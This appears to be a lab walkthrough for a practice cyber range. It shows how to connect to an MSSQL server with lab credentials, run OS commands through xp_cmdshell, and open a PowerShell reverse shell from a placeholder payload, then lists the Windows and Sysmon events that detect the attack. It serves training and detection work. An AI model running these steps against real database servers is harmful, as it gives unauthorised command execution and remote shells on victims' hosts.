# WT#041 — MSSQL xp_cmdshell

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) |
| **Domain** | child.cadre.local |
| **Starting Credential** | analyst_t1 / T13r_An@lyst! (or SA: s@_P@ssw0rd!L@b!) |
| **Tools Required** | impacket-mssqlclient |
| **Certifications** | OSCP+ |
| **MITRE ATT&CK** | T1059.009 |
| **Difficulty** | Easy |

## Prerequisites
- xp_cmdshell enabled on mbr01 MSSQL instance
- SQL login or Windows auth access

## Attack Steps

### 1. Connect to mbr01 MSSQL
```powershell
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -windows-auth
```

### 2. Verify xp_cmdshell is enabled
```sql
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### 3. Execute OS commands
```sql
EXEC xp_cmdshell 'whoami';
```

```sql
EXEC xp_cmdshell 'hostname';
```

```sql
EXEC xp_cmdshell 'ipconfig';
```

### 4. Reverse shell
```sql
EXEC xp_cmdshell 'powershell -e <BASE64_REV_SHELL>';
```

## Post-Exploitation Chain
MSSQL xp_cmdshell → OS command as NT SERVICE\MSSQLSERVER → Host compromise (mbr01)

## Telemetry Verification
- **Event 4688**: cmd.exe spawned by sqlservr.exe
- **Sysmon Event 1**: xp_cmdshell parent-child relationship
- **Event 5156**: Outbound network connection from mbr01 MSSQL process

## Status
CONFIGURED
